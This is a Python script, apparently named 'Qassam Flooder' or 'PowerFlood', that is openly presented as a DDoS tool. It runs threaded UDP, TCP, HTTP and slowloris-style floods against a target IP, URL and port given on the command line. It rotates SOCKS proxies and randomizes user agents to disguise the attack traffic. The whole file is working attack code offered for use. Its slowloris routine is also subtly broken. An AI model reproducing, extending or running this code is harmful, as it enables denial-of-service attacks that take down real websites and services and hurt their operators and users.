#!/usr/bin/env python3
# Code by Sheikh
import argparse
import random
import socket
import threading
import requests
from colorama import Fore, Style
from fake_useragent import UserAgent
import socks
import ssl

black = "\033[30m"
white = "\033[37m"
green = "\033[32m"
red = "\033[31m"
reset = "\033[0m"

def print_flag():
    print(f"{red}█{reset}{black}█████████████████████████████████{reset}")
    print(f"{red}███{reset}{black}███████████████████████████████{reset}")
    print(f"{red}█████{reset}{black}█████████████████████████████{reset}")
    print(f"{red}███████{reset}{white}███████████████████████████{reset}")
    print(f"{red}█████████{reset}{white}█████████████████████████{reset}")
    print(f"{red}███████{reset}{white}███████████████████████████{reset}")
    print(f"{red}█████{reset}{green}█████████████████████████████{reset}")
    print(f"{red}███{reset}{green}███████████████████████████████{reset}")
    print(f"{red}█{reset}{green}█████████████████████████████████{reset}")

print_flag()

def banner():
    print(Fore.GREEN + "#########################################")
    print(Fore.WHITE + "#             Qassam Flooder            #")
    print(Fore.WHITE + "#       Code By Sheikh - DDoS Tool      #")
    print(Fore.GREEN + "#########################################" + Style.RESET_ALL)

user_agents = UserAgent()

custom_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Ubuntu 20.04; x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
]

ap = argparse.ArgumentParser(description="PowerFlood - DDoS Tool by Sheikh")
ap.add_argument("-c", "--choice", required=True, type=str, choices=['udp', 'tcp', 'http', 'slowloris'], help="Flood type")
ap.add_argument("-u", "--url", type=str, help="URL for HTTP flood")
ap.add_argument("-i", "--ip", type=str, help="Target IP address")
ap.add_argument("-p", "--port", type=int, help="Port number")
ap.add_argument("-t", "--times", type=int, default=50000, help="Number of packets to send")
ap.add_argument("-th", "--threads", type=int, default=5, help="Number of threads")
ap.add_argument("-pfile", "--proxyfile", type=str, help="File with proxies")
args = vars(ap.parse_args())

banner()

ip = args['ip']
port = args['port']
choice = args['choice']
url = args['url']
times = args['times']
threads = args['threads']
proxyfile = args['proxyfile']

def load_proxies():
    proxies = []
    if proxyfile:
        with open(proxyfile, 'r') as file:
            for line in file:
                proxies.append(line.strip())
    return proxies

proxies = load_proxies()

def run_udp():
    data = random._urandom(1024)
    flood_status = random.choice([Fore.YELLOW + "[*]" + Style.RESET_ALL,
                                  Fore.RED + "[!]" + Style.RESET_ALL,
                                  Fore.GREEN + "[#]" + Style.RESET_ALL])

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            for x in range(times):
                s.sendto(data, addr)
            print(flood_status + Fore.CYAN + " UDP Packet Sent!!!" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[!] Error!!!" + Style.RESET_ALL)

def run_tcp():
    data = random._urandom(16)
    flood_status = random.choice([Fore.YELLOW + "[*]" + Style.RESET_ALL,
                                  Fore.RED + "[!]" + Style.RESET_ALL,
                                  Fore.GREEN + "[#]" + Style.RESET_ALL])

    while True:
        try:
            if proxies:
                proxy = random.choice(proxies)
                proxy_info = proxy.split(':')
                socks.set_default_proxy(socks.SOCKS5, proxy_info[0], int(proxy_info[1]))
                socket.socket = socks.socksocket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for x in range(times):
                s.send(data)
            print(flood_status + Fore.CYAN + " TCP Packet Sent!!!" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[*] Error" + Style.RESET_ALL)
            s.close()

def run_http():
    flood_status = random.choice([Fore.YELLOW + "[*]" + Style.RESET_ALL,
                                  Fore.RED + "[!]" + Style.RESET_ALL,
                                  Fore.GREEN + "[#]" + Style.RESET_ALL])

    while True:
        try:
            headers = {'User-Agent': random.choice([user_agents.random] + custom_user_agents)}
            if proxies:
                proxy = random.choice(proxies)
                proxy_info = proxy.split(':')
                socks.set_default_proxy(socks.SOCKS5, proxy_info[0], int(proxy_info[1]))
                socket.socket = socks.socksocket
            response = requests.get(url, headers=headers)
            print(flood_status + Fore.CYAN + f" HTTP Request Sent! Status: {response.status_code}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[*] HTTP Error" + Style.RESET_ALL)

def run_slowloris():
    flood_status = random.choice([Fore.YELLOW + "[*]" + Style.RESET_ALL,
                                  Fore.RED + "[!]" + Style.RESET_ALL,
                                  Fore.GREEN + "[#]" + Style.RESET_ALL])

    while True:
        try:
            headers = {
                'User-Agent': random.choice([user_agents.random] + custom_user_agents),
                'Content-Length': '9999'
            }
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((url, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {url}\r\n{headers}\r\n\r\n".encode())
            print(flood_status + Fore.CYAN + " Slowloris Attack Sent!!!" + Style.RESET_ALL)
            s.close()
        except Exception as e:
            print(Fore.RED + f"[!] Error: {str(e)}" + Style.RESET_ALL)

for y in range(threads):
    if choice.lower() == 'udp':
        if port is None:
            print(Fore.RED + "[!] Port is required for UDP flood!" + Style.RESET_ALL)
            break
        th = threading.Thread(target=run_udp)
        th.start()
    elif choice.lower() == 'tcp':
        if port is None:
            print(Fore.RED + "[!] Port is required for TCP flood!" + Style.RESET_ALL)
            break
        th = threading.Thread(target=run_tcp)
        th.start()
    elif choice.lower() == 'http':
        if not url:
            print(Fore.RED + "[!] URL is required for HTTP flood!" + Style.RESET_ALL)
            break
        th = threading.Thread(target=run_http)
        th.start()
    elif choice.lower() == 'slowloris':
        if port is None or not url:
            print(Fore.RED + "[!] URL and Port are required for Slowloris attack!" + Style.RESET_ALL)
            break
        th = threading.Thread(target=run_slowloris)
        th.start()
